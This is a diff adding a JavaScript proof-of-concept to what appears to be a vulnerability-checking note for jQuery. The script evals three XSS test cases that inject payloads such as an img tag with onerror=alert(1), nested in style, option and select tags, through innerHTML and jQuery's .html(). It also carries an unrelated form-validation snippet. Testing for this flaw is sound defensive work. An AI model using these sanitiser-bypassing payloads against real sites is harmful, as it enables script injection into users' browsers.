@@ -74,3 +74,64 @@ output - if "true" vulnerable - see https://blog.jquery.com/2019/04/10/jquery-3-
 output - if "false" not vulnerable
 
 ------
+
+
+
+var allInOneScript = `
+// Create a container div for the buttons
+var buttonContainer = document.createElement("div");
+document.body.appendChild(buttonContainer);
+
+// PoC 1
+var poc1HTML = \`
+<h2>PoC 1</h2>
+<button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>
+<xmp id="poc1">
+  <style><style /><img src=x onerror=alert(1)> 
+</xmp>
+\`;
+
+// PoC 2
+var poc2HTML = \`
+<h2>PoC 2 (Only jQuery 3.x affected)</h2>
+<button onclick="test(2)">Assign to innerHTML</button> <button onclick="test(2,true)">Append via .html()</button>
+<xmp id="poc2">
+  <img alt="&lt;x" title="/><img src=x onerror=alert(1)>">
+</xmp>
+\`;
+
+// PoC 3
+var poc3HTML = \`
+<h2>PoC 3</h2>
+<button onclick="test(3)">Assign to innerHTML</button> <button onclick="test(3,true)">Append via .html()</button>
+<xmp id="poc3">
+  <option><style></option></select><img src=x onerror=alert(1)></style>
+</xmp>
+\`;
+
+// Append the HTML content to the container div
+buttonContainer.innerHTML = poc1HTML + poc2HTML + poc3HTML;
+
+// Define the test function in the global scope
+function test(n, jq) {
+  sanitizedHTML = document.getElementById('poc' + n).innerHTML;
+  if (jq) {
+    $('#div').html(sanitizedHTML);
+  } else {
+    var div = document.createElement("div"); // Define div as a new div element
+    div.innerHTML = sanitizedHTML;
+    document.body.appendChild(div); // Append div to the document body
+  }
+}
+
+// Form submission code
+$(document).on('invalid-form.validate', 'form', function () {
+  var button = $(this).find('input[type="submit"]');
+  setTimeout(function () {
+    button.removeAttr('disabled');
+  }, 1);
+});
+`;
+
+// Execute the code
+eval(allInOneScript);
